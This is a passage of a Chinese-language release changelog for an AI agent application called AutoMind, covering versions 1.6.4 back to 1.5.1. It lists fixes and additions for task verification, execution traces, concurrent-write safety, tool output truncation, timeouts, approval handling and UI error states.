- **✅ 验收设施故障不再白烧修复轮、也不再谎报「验收未过 ✗」**：`_loop_verify`
  此前异常时返回 `{"done": False, "reason": "无法判定，继续尝试。"}`，调用方
  把它当成"验收未通过"，于是**空烧最多 2 轮修复 token**，最后还给用户报一个
  "验收未过"。现在验收结论带 `available` 标记：不可用时**不进修复轮**（拿不到
  反馈的修复轮纯属烧钱），并如实说明"本次未做验收（不会据此判定任务失败）"。
- **🧪 项目测试"跑不起来"与"项目里没有测试"不再混为一谈**：此前两者都静默
  返回 None、摘要里一个字都不出现。现在前者显示「测试未能运行 ⚠」并给出原因。
- **🎯 失败原因不再被笼统一句话盖掉**：计划步骤失败时报告的
  `Failed after N attempts` 会把工具报的真实错误吞掉，模型只能盲目重试。
  现在保留最后一次的真实原因（含异常类型与信息）。

### 新增 — 验收判据加入产物级确定性断言

- **📄 "模型说做了"必须对上"磁盘上真有"**：验收此前只把 `output[:2500]` 交给
  LLM 做文本自评 —— 同一个模型既当运动员又当裁判，仍可能"自嗨通过"，且**没有
  任何产物证据**。现在验收分两段：
  1. **确定性断言（不花 token）**：从任务与结果里抽出被声称产生的文件路径，
     逐个核验**是否存在**、**是否为空**（0 字节不算交付）、任务点名的关键词
     （"包含 X"）是否**真的出现在内容里**。任一断言失败 → 直接判未完成，
     **LLM 无权推翻**；
  2. 再由 LLM 判断剩余部分，且把已核验的客观事实写进提示，不许它推翻或要求
     重新生成。

  保守口径：只有任务本身在要文件时才把"文件不存在"当硬失败，纯分析任务顺带
  提到一个路径名不会因此判败。

### 新增 — 执行证据落盘（Session Trace）

- **🧾 进程重启后仍能查证"这次任务到底做了什么"**：观测中心此前只有内存里的
  实时 DAG，重启即失；仓库里唯一落盘的 `srv.log` 是 uvicorn **访问日志**，
  只有 HTTP 状态码，看不到任何 Agent 行为。B 端排障、SLA 举证、失败归因因此
  全都无据可查。现在同一份事件流**逐条落盘**为 JSONL：
  `<数据目录>/traces/<会话>/<run>.jsonl`，一条事件一行，可 `tail -f`、可流式解析。
  - **按 run 切文件**：一个会话的多次任务各自成文件，取某次证据不必过滤历史；
  - **双重上限**：单文件字节上限（超出只计数不再写正文）+ 每会话保留数 +
    全局目录配额，轨迹不会把磁盘吃满；
  - **敏感信息脱敏**：`api_key` / `token` / `password` 等字段落盘前一律 `***`；
  - **绝不阻断主流程**：写不进去只记一行警告，不允许轨迹问题把任务判败；
  - **可下载**：新增 `GET /api/observe/traces`、`.../{session}/{run}`、
    `.../download`，界面「通用设置 → 观测与轨迹」可直接查看占用、看事件尾部、
    下载原始 JSONL 贴进工单。

### 修复 — 目录级并发写冲突（会话隔离已解决，目录隔离未解决）

- **🗂 两个会话改同一个文件不再静默互相覆盖**：执行态早已按会话隔离，但克隆
  仍**共享同一项目目录**。并发改同一工作区时文件写入会竞态覆盖，而回滚记录是
  按文件记的 —— A 的回滚会把 B 的成果一起"恢复"掉，全程无声。现在三层防护：
  1. **按路径异步锁**（`tools/write_guard.py`）：同一路径的
     `读 → 改 → 写` 串行化，杜绝交错覆盖；不同路径互不阻塞，不牺牲并行度；
  2. **来源追踪 + 外来改动检出**：记住"每个文件最近是谁写的"，当我要覆盖一个
     **别的会话刚改过、而我从未读过**的文件时，按
     `write_conflict_policy` 给出确定性结论 —— `warn`（默认，写入但明确提示）
     / `block`（直接拒绝并回显当前内容）/ `off`；
  3. **确定性前置条件**：`file_read` 现在返回 `content_hash`，模型可原样回传给
     `file_write` / `file_edit` 的 `expected_hash`，声明"我只覆盖我读到的那一版"；
     指纹不符即失败并附当前内容，让它基于真实状态重做。
- **📁 可选的会话独立工作目录**：`isolate_workspace=true` 时每个会话在自己的
  工作副本里干活，从根上消除跨会话覆盖（自动跳过 `.git` / `node_modules` /
  各类缓存；超过文件数上限则**如实降级**为共享目录并说明原因，绝不假装隔离成功）。
  **默认关闭** —— 它改变产物的落点，必须是用户的显式选择。配套
  `_session_output/` 导出，产物不会"活干完了但找不到"。

### 修复 — ReAct/编程模式缺"部分交付清单"

- **📋 迭代上限耗尽 / 中途被取消时，不再把已完成的工作丢掉**：此前只返回最后
  一段思考加一句"已达最大迭代步数"，用户既不知道做成了什么，也不知道卡在哪，
  只能重跑一遍再烧一次 token。现在返回结构化的**部分交付清单**：停止原因、
  迭代进度、成功/失败动作数、**已产出的文件清单**、仍未解决的失败及原因、
  按时间顺序的动作明细、下一步建议。被取消（用户点了停止）时同样留下清单。
- **🎯 成功判定改用结构化停止原因**：不再靠"回复文本里有没有『最大迭代步数』
  几个字"来判断（模型自己复述这几个字就会被误判失败，也无法区分"到达上限"
  与"被取消/异常中断"）。文本匹配仅作兜底保留。

### 修复 — 并行执行的单点异常防护

- **🛡 一个步骤炸掉不再连累同批其它步骤**：`asyncio.gather` 默认"任一任务抛异常
  就整体失败" —— 工具侧偶发异常（超时竞态、第三方库抛错、审批通道断开）会让
  **同一批里已经跑完的目标一起丢失**，整单任务判败，用户看到的是"什么都没做"。
  现在每个目标单独包一层异常屏障，异常就地转成该目标的失败结果，走与普通失败
  完全相同的后续流程（自我纠错 → 回溯 → 报告）。
- **📊 批内失败时已完成的目标不再从报告里消失**：此前失败分支直接 `break`，
  同批中已成功的目标虽然跑完了，却不会被记进执行报告 —— 报告与界面上它们
  凭空消失。现在先完整入账再终止推进（终止语义不变）。

### 新增 — 压缩损失可观测化

- **🔍 "长任务越跑越省"从此看得见**：折叠机制此前只有一条"预算 80% 了"的信号，
  看不到到底省下多少、还能不能再省。现在每次压缩都产出账目：折叠条数、
  回收字符数、**压缩率**、**估算 token 节省**、每条保留的字符数；ReAct 每轮
  还汇总一份"省 token 总账"（工具下发预算 + 历史折叠 + 单条截断）推入观测中心。
- **⚙️ 每消息截断上限可配**：`execution.compact_keep_obs_chars` 控制折叠旧观察时
  每条保留多少字符（`0` = 用内置默认 240）。

### 修复 — 工具输出体积失控（token 成本与上下文超载的最大单一来源）

- **✂️ 当前轮刚产生的大输出，在进上下文之前就被夹住**：`tool_results_to_messages`
  此前把 `str(result.output)` **原样**放进下一轮请求，没有任何截断保护 ——
  一次大文件读取、一次长网页抓取、一次几千行终端输出，下一轮请求体整体重发，
  而且此后每一轮都要重发。折叠机制只在预算用到 80% 后才作用于**历史消息**，
  根本来不及救当前轮。现在：
  - 默认单条上限 **12000 字符**（可配，`0` = 恢复旧行为），按「头 + 尾」截断
    —— 报错与结论通常在尾部，命令用法/表头通常在头部，砍中间；
  - 截断说明**必须包含可执行指引**（缩小参数范围 / 用 offset+limit 分段 /
    只取关键行），而不是让模型原样重试；
  - 每次截断都记入账目并推入观测中心（`tool_output_truncated` 事件 +
    `react_savings` 总账），"这次任务有多少上下文是被截掉的"从隐形变为可见。

### 修复 — 终端命令超时策略

- **⏱ 默认超时从 120s 提到 300s，且可配可申请**：对 `pip install` / 编译 /
  长测试，120s 明显偏短；超时后进程被杀、状态丢失、任务判败，模型只能盲目重跑
  （再下载一次、再编译一次）。现在默认值取自
  `execution.tool_timeout_seconds`，模型可显式加大到
  `tool_timeout_max_seconds`（默认 1800s）；**超上限时不静默夹取**，而是说明
  实际执行时长。
- **🩺 超时回执自带自愈指引**：明确写出等待了多久、进程被杀、输出已丢失、
  **不要原样重跑**，并给出"用 `timeout=600` 重试"的具体写法；认出安装/构建/
  测试类命令时额外点名建议后台化。
- **🚀 长耗时命令走后台通道**：新增 `terminal(command=..., background=true)`
  立即返回 `task_id`，配 `terminal_background(action='poll'|'output'|'kill'|'list')`
  取回结果 —— 超时不再等于白跑，模型可以先去干别的再回来取。诚实性要求：
  任务没结束就如实返回 `running`（**不算成功**），启动失败不给假 `task_id`，
  手动终止的状态是 `killed` 而不是 `failed`（否则用户永远看不出是自己停的）。

### 新增 — 审批等待占槽治理

- **🎫 审批等待期间释放并发槽**：审批弹窗挂多久，这个任务的并发槽就占多久 ——
  5 分钟不点，名额就空转 5 分钟，别的任务被"已达并发上限"挡在门外，而用户完全
  看不出两者有关。现在开始等待时把槽还回去，用户真的回答了（或超时终结）再收回，
  并单独统计"正在等待审批"的任务数。
- **⚙️ 超时策略显式参数化**：`execution.approval_timeout_seconds`（默认 300）
  与 `approval_timeout_action`（`reject` 默认，fail-closed；`approve` 供完全
  可信环境）；超时事件明确告知"已按「自动拒绝」处理"、并入轨迹与观测图，
  并提示可调大或改用「自动/全批准」。

### 新增 — 界面

- **🛡「通用设置 → 执行治理」**：超时、单条输出上限、验收修复轮上限、
  审批超时处置、并发写冲突策略、后台命令通道、审批让槽、轨迹落盘、
  会话独立工作目录，全部可视化调整（数值参数改完即时生效，不必重建 Agent）。
- **📊「通用设置 → 观测与轨迹」**：轨迹占用概览、最近运行列表、一键下载原始
  JSONL、查看事件尾部。

### 新增 — 回归测试

- **🧪 72 条新用例**：`tests/core/test_v164_reliability.py`（18 条：审查/验收不得
  静默化、产物断言压过模型自评、部分交付清单、并行单点异常不连坐）与
  `tests/core/test_v164_governance.py`（54 条：轨迹落盘与脱敏、按 run 轮转、
  写冲突检出与隔离、输出体积夹取、终端超时与后台通道、审批配置 fail-closed）。
- 全量回归 **909 通过 / 3 跳过**（21m45s），`ruff check .` 全绿。
- 路由快照登记 3 个新端点（`test_route_inventory.py`）。

### 工程 — CI 从必红回到全绿

- **✅ `ruff check .` 全仓通过**（CI 里是一条硬门槛，此前 9 处报错让每次提交
  都是红的）：`session_ctx.py` 的私有类命名（`_Binding`，N801）、`background.py`
  里 Python 3.11 起已同义的 `asyncio.TimeoutError`（UP041）、两处无占位符却带
  `f` 前缀的字符串（F541），以及 `function_calling.py` 与
  `test_v164_governance.py` 的导入排序（I001）。
- **🧷 `ExecutionConfig.tool_timeout_seconds` 不再重复定义**：同一字段此前在类里
  出现两次（`120.0` 与 `300.0`），Pydantic 取后者 —— 于是"读到的默认值"和
  "实际生效的默认值"自相矛盾，正是本版要消灭的那类问题。现在只在一处定义并
  注明原因，值仍是 300.0。

### 修复 — 顺带发现并修掉的真实缺陷

- **🗂 会话工作副本可能把自己拷进自己**：工作区根目录若落在项目目录之内
  （例如被配置成 `<project>/.cache/workspaces`），复制时会把刚建出来的副本
  当成项目内容继续往里拷，路径一层层变长直到 Windows 报 `WinError 206`，
  而异常被兜住后只是**静默降级为共享目录** —— 用户完全不知道隔离没生效。
  现在按**路径级**排除（不再只比名字），并有一致性用例守住。
- **🔪 后台任务"杀不掉"**：进程是在后台协程里创建的，调用方拿到 `task_id`
  的那一刻 `process` 还是 `None` —— `kill` 因拿不到句柄而**静默什么都不做**
  （用户以为停了，命令还在跑）。现在先 spawn 再等待，句柄从第一刻起可控。
- **⏳ 终止后台任务可能挂住整个事件循环**：`stdout=PIPE` 时 `await proc.wait()`
  要等到管道关闭，而 shell 派生的子进程会继承管道句柄 —— 父进程被杀后管道
  不关，等待永不返回。现在改为**有界等待**（5s 后放弃并如实记录）。

## [1.6.3] - 2026-08-22

**别再为看不见的东西付钱：每步重发的工具说明书、压错对象的"压缩"、每轮重注的知识库；顺带把长会话从卡顿里捞出来**

### 修复 — 省钱

- **🧰 ReAct 不再每一步都把整本工具说明书重念一遍**：31 个内置工具的 schema
  约 2.5 万字符 ≈ **6k~8k token**，而 ReAct 是一步一次调用 ——
  跑 20 步就有十几万 token 花在"告诉模型它有哪些工具"上，其中绝大多数与任务
  毫不相干（写个 Python 脚本用不上 `email_tool` / `ppt_tool` / `ocr_tool`）。
  现在按任务文本挑相关的一批（默认 14 个）完整下发，其余只在系统提示里留一行
  "名字 — 一句话"的目录；模型在思考里点名某个休眠工具，下一轮就补发完整 schema。
  **能力一个没少**，只是不再每轮重付。`execution.react_tool_budget = 0` 可恢复旧行为。
- **🗜 预算告警时的"压缩"终于压在了实处**：此前用量到 80% 会去调一次 LLM 生成
  上下文摘要 —— 压的却是 `ContextManager`，而那份记录**在 ReAct 路径上从来没进过
  请求体**。结果是花了摘要的钱，下一轮请求体一个 token 都没少。现在优先就地折叠
  ReAct 自己的消息列表（旧的工具观察结果往往一条就好几千字符），**纯本地、不花钱**；
  只有确实没有 ReAct 在跑时才退回摘要压缩。压缩还可以随用量上涨反复触发，
  而不是整个任务只做一次。
- **📚 知识库不再每轮重注一遍**：以前片段拼在提问前面发出去、生成完又从历史里
  还原成原话，于是模型下一轮就看不见了、只好再注入一次 —— 同一份资料连问五轮
  就付五遍（每轮约 500~900 token）。现在片段作为独立消息留在会话里并逐条去重：
  **同一段只付一次**，换话题检索到新片段才注入新的那几段；片段被挤出可见窗口后
  会自动补发。用户原话也不再被改写，历史与实际所说的一致。

### 修复 — 失败不再伪装成"没有数据"

- **📡 补齐上一版的漏网**：30 处 `.catch(() => {})` 全部清理。工具面板、专家市场、
  定时任务、工作区、右侧观测栏、路由与成本、知识库统计…… 现在都会分别说清
  *正在加载* / *加载失败（可重试，带具体原因）* / *确实一条都没有*。
- **🔧「加载中」不再显示成「没有匹配的工具」**（上一版最误导的一处）：工具面板首屏
  会画骨架屏；真的一个工具都没注册时，说的是"没有注册任何工具（多半是安装包不完整）"，
  而不是让人去反复换关键词。
- **✍️ 写操作失败不再一声不吭**：`apiPost` / `apiDelete` 此前拿到 500/403 也照样把
  响应体当正常数据往下传 —— 保存设置、启用插件、添加 MCP、删除文档失败时界面什么
  都不说，用户以为改好了。现在一律抛出带上下文的错误并提示；清空会话时若服务端没
  清掉，会明说而不是谎报"已清空"。

### 修复 — 长会话与长任务不再卡

- **💬 100+ 条的会话不再卡滚动**：消息列表默认只渲染最近 40 条（可点"载入更早"逐批
  展开，展开时视线位置保持不动），各类气泡全部记忆化 —— 新消息进来不再牵动整棵树重排。
- **⌨️ 长回答尾部不再逐字卡顿**：流式输出此前每 50ms 把**整个回答**重新 Markdown
  解析一遍，开销随长度平方增长。现在已定稿的部分增量解析并累积、还在长的尾巴按纯
  文本直出，总开销回落到线性。
- **📈 执行轨迹不再无限累积**：长任务能攒出上万条带渲染 HTML（含 base64 截图）的
  轨迹，观测面板会彻底卡死。现在单个面板保留最近 300 条，并明确标出折叠了多少条 ——
  完整过程在「任务历史」与「观测中心」里照常留存。

### 新增

- **🧪 20 条新回归用例**：`tests/planning/test_react_token_budget.py`（工具预算挑得准
  不准、休眠工具能不能补发、压缩是否幂等、压的是不是 ReAct 那份）与
  `tests/server/test_kb_injection_dedupe.py`（同段不重复注入、新片段照样注入、
  被挤出窗口后要补发）。

## [1.6.2] - 2026-08-19

**把"看起来没事"的失败都变成看得见的：审批超时、加载失败、渲染崩溃**

### 新增

- **🧪 reflection/ 自我纠错测试**（881 行代码，此前零回归保护）新增 54 条用例，
  当场抓出两个真缺陷：
  - `SelfCorrectionLoop.correct()` **每次调用都 TypeError** ——
    `CorrectionResult` 的 `fixed`/`iterations` 无默认值，而该方法一上来就
    `CorrectionResult(original_error=...)`。自我纠错这条公开 API 从来没跑通过；
  - **退避抖动会突破 `max_delay`** —— 先封顶再乘 (0.5 + random())，抖动因子最大
    1.5，配 60s 上限实际能等到 90s。`max_delay` 是承诺，现改为抖动后再夹一次。
- **🔬 CI 补上三处盲区**：
  - 前端从不构建 → 新增 web 作业（pnpm 安装 + `tsc --noEmit` + build +
    **产物完整性校验**：index.html 引用的哈希文件必须存在）；
  - 只在 Linux 跑 → 矩阵补上 windows-latest 与 macos-latest；
  - 打包产物从不验证 → 新增 package 作业：构建 + twine check + 商业代码审计 +
    **装进干净 venv 冒烟**（内置插件要能 discover 且 load 成功、MCP 预设与技能齐备、
    静态资源在包内、`automind --version` 可用）。

### 修复

- **审批弹窗 300 秒静默超时**：超时后端**静默**按拒绝处理，而弹窗还挂在界面上 ——
  用户以为系统仍在等他点，实际任务早已失败。现在弹窗显示**倒计时**（最后 2 分钟
  变黄、1 分钟变红）并写明超时后果；超时时推送事件 + 记日志，前端关掉弹窗并弹一条
  **不自动消失**的提示。超时秒数可用 `AUTOMIND_APPROVAL_TIMEOUT` 调整。
- **REST 失败被系统性静默吞掉**：`apiGet` 原本只是 `return r.json()`，HTTP 500、
  401、后端返回的 `{"error"}` 统统当正常数据传下去，而调用方普遍写着
  `.catch(() => {})`（全仓库 30 处）。结果服务挂了、令牌过期、接口 500，
  界面一律显示"暂无数据"。新增 `ApiError`（带 status/path 与面向用户的文案），
  非 2xx 一律抛出；**403 + feature 字段例外** —— 那是版本门控的正常答复。
- **首屏加载被误渲染为空态**（最误导的一处）：各视图首帧 state 还是空数组，
  于是**加载中被画成"暂无数据"**；Audit/Kb/Stats 更糟 —— 失败时
  `if (!data) return <Card loading />` 会**永远转圈**。新增 `useAsync` 三态钩子与
  `AsyncBoundary`，五个视图改为分别说"正在加载""加载失败（+重试+HTTP 状态）"
  "确实没有数据"；出错时保留上一次数据并在顶部挂错误条，一次网络抖动不该清空已显示的内容。
- **任一渲染异常 = 整页白屏**：没有 ErrorBoundary 时，一个组件抛异常 React 会卸载
  整棵树。现在两层兜底：整页级（刷新 + 复制诊断信息）与**视图级**
  —— 单个面板炸了，侧边栏、顶栏与正在跑的任务都还在，可以直接切别的页面继续用。

## [1.6.1] - 2026-08-18

**开箱可用性与社区门面：浏览器零配置可用、审批可改参数、界面细节收拾干净**

### 新增

- **🙋 「修改后批准」真的能用了**：`ApprovalAction.MODIFY` 与
  `ApprovalResponse.modifications` 早在枚举里定义了，但整条链路都无从表达它 ——
  审批回调只返回 `bool`，Web 弹窗只有「批准」「拒绝」，CLI 只有 A/D/S/Q。
  遇到"命令基本对、就是路径写错了"，用户只能拒绝再让模型重来一轮。现在：
  - Web 审批弹窗新增「✎ 修改参数」，逐项编辑、标出改动项，按原值类型回传
    （`timeout=30` 改成 `"60"` 会还原成 int，否则工具拿到字符串行为异常）；
  - CLI 新增 `[M]odify`：逐项询问、回车保留原值、`!cancel` 放弃；
  - 经典界面（`static/js/ws.js`）同步实现；
  - ReAct 与 Plan 两条执行路径都会**按改后的参数执行**。
- **🌐 浏览器零配置可用**：Playwright 的 Python 包不含浏览器本体，没跑过
  `playwright install` 时会撞上一大段英文报错；桌面版更无解（冻结包里没有
  可用的 `playwright` 命令行）。现在三级回退：自带 Chromium →
  **系统已装的 Edge / Chrome**（Windows 上 Edge 是系统组件，零下载即可用）→
  都没有才报错，且是中文说明 + 可照抄的安装命令。
- **🤝 社区健康文件补齐**：`SECURITY.md`（含威胁模型：哪些算漏洞、哪些是
  设计内行为）、`CODE_OF_CONDUCT.md`、`CODEOWNERS`、Bug/功能 Issue 模板、
  PR 模板。README 补上 7 个 badge 与 5 张界面截图。

### 修复

- **观测中心 DAG 节点文字画到框外**：节点标签按**字符数**截断
  （`slice(0, 22)`），但 SVG `<text>` 既不换行也不省略，而 CJK 是全角 ——
  22 个汉字≈275px，节点框才 190px，中文步骤名必然溢出并与相邻节点重叠。
  改为按**估算像素宽度**截断（CJK 计 1em、其余 0.55em），节点放宽到 232×50；
  节点详情卡改为在正文换行显示完整描述。
- **启动时的黑屏闪烁**：`body` 的 `.light` 类是在 React 挂载后才加的，而
  `index.html` 的兜底样式硬编码了深色 —— 浅色主题用户每次打开都先看到近黑的
  启动画面，挂载后再猛地跳成白色。现在在 `<head>` 里同步定主题，样式表一加载
  就是正确配色。桌面版启动画面同理（新增 `/api/config/ui` 落盘主题供 launcher 读取）。
  实测两种主题现在全程只有一个背景色，此前浅色是三段跳变。
- **计划视图只显示一列灰字**：后端 `_serialize_plan` 送来的 `task` / `status` /
  `preconditions` / `expected_effects` / `revision_history` 一个都没用上。
  重做为组件树：进度统计块、可展开的前置条件与预期结果、工具徽标、
  状态标签、计划修订历史；缩进改用引导线，描述换行时层级依然清楚。
- **`ApprovalOutcome` 的布尔陷阱**：审批结果从 `bool` 换成 dataclass 后，
  实例默认恒为真 —— 任何遗留的 `if not approved:` 会把"拒绝"当成"批准"放行。
  已绑定 `__bool__`，即使调用方没改也仍然 fail-closed。
- `plan_executor.py` 缺 `logger` 定义（新增日志行会 NameError）。

## [1.6.0] - 2026-08-13

**开箱即用能力大扩容：内置插件 / 工具 / 技能 / MCP 适配 + 界面美化**

### 新增

- **🧩 内置 4 个插件**（随包分发，默认自动加载）：
  - `cost_tracker` 成本追踪：每次任务结束把 Token 用量与耗时记入 `~/.automind/cost_tracker.csv`；
  - `pii_guard` 敏感信息守卫：检测输入与工具输出中的 API Key / Token / 私钥并写入 `~/.automind/pii_audit.log` 告警（复用 `core/redact.py` 规则）；
  - `task_notify` 任务完成通知：写本地 `~/.automind/notifications.log`，可选经 `AUTOMIND_NOTIFY_WEBHOOK` 推送企业微信/钉钉/Slack；
  - `hello_hooks` 示例插件：挂接全部 8 个生命周期钩子，供第三方抄模板。
  - 插件面板新增「内置 / 自定义」标签区分；内置插件随包分发（`pyproject.toml` package-data）。
- **🛠 内置 11 个工具**（可选依赖懒加载，缺库返回可照抄的安装命令）：
  `screenshot_tool` 截屏、`ocr_tool` 文字识别、`ppt_tool` 幻灯片生成、
  `git_tool` 结构化 git 操作（含 force 门控）、`image_tool` 图像处理、
  `csv_tool` CSV/JSON 转换、`clipboard_tool` 剪贴板、`chart_tool` 图表、
  `audio_tool` 音频信息、`video_tool` 视频信息/抽帧、`process_tool` 进程/端口。
- **✨ 内置 6 个技能**（场景化工作流）：`excel_report` 表格汇总报告、
  `web_research` 多来源带引用调研、`data_insight` 统计与相关性洞察、
  `doc_batch` 批量 Word/PDF、`article_writer` 公众号/小红书风格写作、
  `env_doctor` 环境诊断（依赖/端口/磁盘）。
- **🔌 内置 7 个 MCP 官方适配预设**（一键添加）：GitHub、PostgreSQL、MySQL、
  Slack、飞书、钉钉、Playwright 浏览器。MCP 面板新增「官方适配」卡片，
  点「添加」即写入配置并连接；需密钥的服务会提示设置对应环境变量。
- **🖼 浏览器交互可视化**：浏览器/截图工具返回的网页截图会以图片形式
  直接渲染在对话框的执行流程里，看得到"网页交互效果"。
- **🎨 界面美化**：观测中心指标卡片化（图标+色调区分成功/失败/回溯）、
  DAG 节点悬停提示、图例 Tag 化；通用设置分组化（项目目录/采样参数/
  自主任务闭环/界面偏好四节清晰分隔）。
- **🎨 面板视觉统一层**：工具/技能/MCP/插件/知识库/专家/团队/统计/历史
  此前各写各的内联样式，同一个"卡片"在不同面板里边距圆角字号全不一样。
  现抽出共用语汇（页头 / 实体卡 / 来源徽标 / 统计块 / 空态 / 看板 / 活动流），
  各视图只填内容。空态一律说清"为什么空 + 下一步做什么"，不再只写"暂无数据"。
- **🏷 能力来源一眼可辨**：工具面板给每项标注 <内置> / <MCP> / <插件> 徽标，
  并按来源分组、支持筛选与搜索；`/api/tools` 新增 `source` 字段。
  技能与插件同样区分"内置（随软件分发）"与"自定义（你导入的）"。
- **🇨🇳 工具面板中文化**：工具的 `description` 是写给模型看的提示词，必须保持
  英文精确措辞；但中文界面里排着 31 段英文说明没人会读。新增前端展示层
  （`web/src/lib/toolMeta.ts`）给内置能力配中文名与一句话说明，原始标识符以
  等宽小字附在后面；查不到的（MCP/插件工具）自动回落英文原文。模型侧零改动。

### 修复

- **工具面板图标溢出卡片**：`Space` 布局下正文列没有 `min-width: 0`，
  长英文描述与长参数名会把卡片顶破、图标被挤出容器。改用显式的
  图标(固定不收缩) / 正文(可收缩) / 操作(固定不收缩) 三列结构。
- **统计页的数字自相矛盾**：「累计 Token」读的是进程内存计数器（重启即清零），
  而「按模式聚合」读的是持久化任务历史 —— 重启后同一屏会出现
  「累计 Token 0」与「编程模式 108,203 tk」并存，两个数至少错一个且不报错。
  现在两者出自同一份历史数据，结构上不可能对不上；本次运行的实时增量
  改用独立字段 `tokens_session` 返回。
- **任务历史卡片标题空白**：任务内容为空的记录只剩几个徽标，看着像渲染坏了；
  早期未记录 `interaction` 的记录还会渲染出一个空白药丸。现分别给出
  「（无任务内容）」占位与「未记录模式」标签。

## [1.5.2] - 2026-08-12

**开箱即用专版：6 项"第一次跑就会撞上"的缺陷**

这一版没有新功能，全部是新用户按 README 敲第一条命令就会遇到的问题。

### 修复

- **控制台 GBK 编码崩溃（影响面最大）**：中文 Windows 控制台默认代码页 936，
  `sys.stdout` 是 `cp936` + `errors='strict'`，写一个 `╔` 或 `✅` 就是
  `UnicodeEncodeError` —— **不是乱码，是整个进程崩掉**。受影响的是**所有**
  控制台路径：`python -m automind.server` 启动横幅、CLI 任务执行报告、
  REPL/TUI 界面。`launch.bat` 里的 `chcp 65001` 只掩盖了一个入口，照 README
  直接敲命令的用户拿到的仍是崩溃栈。新增 `automind/core/console.py`：进程内
  把控制台代码页切到 65001（**退出时还原**，不给用户的 shell 留副作用），
  并把 stdout/stderr 重配为 UTF-8 + `errors="replace"` —— 即便代码页切换失败
  （无控制台/被重定向）也只会显示替代字符，永不再抛异常。
- **默认模型与实际 Key 不匹配**：代码默认 `provider=openai` / `model=gpt-4o`，
  而多数用户只配了 DeepSeek 一家的 Key，结果是启动即 `llm_init_failed
  provider='openai'`，界面只说"模型连接失败"，用户根本不知道要去设置里换一家。
  新增 `automind/core/provider_resolver.py`：**用户尚未显式选过提供商时**自动
  对齐到配得起的那家，并给一句明确的中文提示（"未检测到 OpenAI 的 API Key，
  已检测到 DeepSeek Key，将使用 deepseek-chat"）。CLI 直接打印，Web 经
  `/api/status` 的 `llm_notice` 字段返回。用户**显式**选了某家时不擅自改换，
  只提示 Key 未配置。
  · 顺带把 provider → 环境变量的映射收敛为单一数据源 —— 此前 `config.py` /
  `server_store.py` / `server.py` 各写一份，`config.py` 那份漏了
  `moonshot`/`qwen`/`glm`/`gemini`/`dashscope` 等别名。
- **社区版并发任务共享全局 Agent 状态**：`_acquire_run_agent()` 在没有企业版
  会话池时**直接返回全局 `_agent`**，而 WebSocket 路径压根没调用它。该实例的
  `_interaction`（交互模式）、`_mode`、`context_mgr`（上下文）、`_current_plan`、
  `llm.usage`（token 计数）全被并发任务共用 —— 开两个标签页同时跑（上限 8 并发）
  会出现：A 的"对话"模式被 B 的"循环编程"覆盖、两边上下文互相串、token 统计被
  对方 `reset()` 清零，**且一声不吭**。新增 `AutoMindAgent.clone_for_session()`：
  共享重且只读的部分（工具/技能注册表、记忆库、项目索引、环境探测），只独享
  执行态，代价是毫秒级。REST 与 WS 两条路径均改为先取会话 Agent 再切模型。
- **切模型/切模式卡 2~3 秒**：`_apply_mode_model()` → `_rebuild_agent()` 每次都
  完全重建 Agent（重新 `AgentConfig.auto_load` 扫盘、重建 ChromaDB、重注册全部
  工具与技能、重扫项目索引），而真正变化的只有一个模型名。新增
  `AutoMindAgent.switch_llm()` 只替换 LLM 后端，并同步规划器/执行器/反思模块
  持有的 `llm` 引用（只换 `agent.llm` 会出现"界面显示已切到 B、实际仍在用 A"）。
  设置面板的模型/地址/Key 变更同样改走这条路径。
  · **连带修复（真正的大头）**：只换 LLM 后仍要 1.15 秒，profile 显示 **97%
  花在 `SSLContext.load_verify_locations`** —— 解析整个 CA 证书包单次约 380ms，
  而 httpx 每建一个客户端要建 3 个（直连 + 两个代理传输）。新增全进程共享的
  `shared_ssl_context()`，各 provider 复用同一个上下文（`follow_redirects`
  与连接池上限对齐 SDK 自带客户端，避免中转代理跳转行为变化）。
  实测：**切模型 1150ms → 0.7ms，会话克隆 1150ms → 1.3ms**，整体重建 2.2s → 1.0s。
  · **连带修复**：`OpenAIProvider` / `AnthropicProvider` 此前沿用基类的空
  `close()`，httpx 连接池从不释放；每会话一个客户端后这会持续泄漏，已补上。
- **async 端点内同步文件 IO 阻塞事件循环**：`api_fs_list` / `api_preview_file` /
  `api_files_tree` / `api_files_read` / `api_files_write` / `api_changes_diff`
  在 `async def` 里直接 `iterdir` / `read_text` / `write_text`。单次是毫秒级，
  但并发时会把**整个事件循环**顶住 —— 连正在流式输出的 WebSocket 一起卡。
  全部挪进 `asyncio.to_thread()`；`/api/config` 的配置落盘同样处理。
- **`automind` 命令不存在**：包未安装，用户按 README 敲 `automind ...` 得到
  command not found。已 `pip install -e ".[web]"`，`automind` 命令与 README 对齐。
- **端口被占用时静默失败 → "改了代码但版本没更新"**：端口已被别的 AutoMind
  （多为已安装的桌面版）占着时，uvicorn 只在日志里留一行英文 bind 错误就
  **静默退出且返回码为 0**，而屏幕上最后停留的是横幅里的"打开浏览器访问
  http://127.0.0.1:8765"。用户照做，打开的其实是那个一直在跑的旧实例 ——
  于是得出"新版本没生效"的结论（本条正是由该现象反查出来的）。现在启动前
  预检端口：占用时探测占用者的 `/api/health`，明确告知
  「端口 8765 已被占用 · 占用者 AutoMind v1.5.0（桌面版安装包）· 现在用浏览器
  打开看到的是它，而不是你刚启动的 v1.5.2」，并给出可照抄的换端口命令，
  **不再打印那句会误导人的"打开浏览器访问"**，退出码改为 1。
  只把 `EADDRINUSE`/`EACCES` 判为占用 —— 本机没有该 IP 之类的绑定失败仍交回
  uvicorn 报原始错误，避免误报把用户引向错误方向。

### 文档

- 用户手册（HTML / Markdown）更新日志章节新增 v1.5.2 条目。

新增 25 条回归测试（`tests/test_ux_fixes_v152.py`），覆盖 GBK 流不再抛异常、
提供商回退选路、会话克隆的共享/独享边界、`switch_llm` 不重建注册表、
以及各 async 端点确实走了线程池。

## [1.5.1] - 2026-08-09

**可靠性与可观测性专版：5 项静默失败 + 3 项体验缺口**

修复过程中另外发现并修掉 6 处叠加缺陷，均在下文标注。

### 可靠性

- **Q4 · 循环依赖检测到却不处理**：`_resolve_cycles` 原本是 `return root` ——
  检测到环什么也没做，随后 `topological_order()` 直接抛
  "Dependency graph contains a cycle!"。现在断开闭合环的**回边**（保留
  `A→B→C` 正常分解链，破坏最小），迭代重检直到无环。
  · **连带修复**：`_add_goal_recursive` 与 `Goal.all_children()` 都是无防护递归，
  目标树真成环时在 `check_cycles()` **之前**就 RecursionError 爆栈 ——
  消环逻辑压根没机会运行。均加对象身份去重。
- **Q5 · 两处空实现**：`plan.updated_at = plan.updated_at` 是自赋值（回溯后
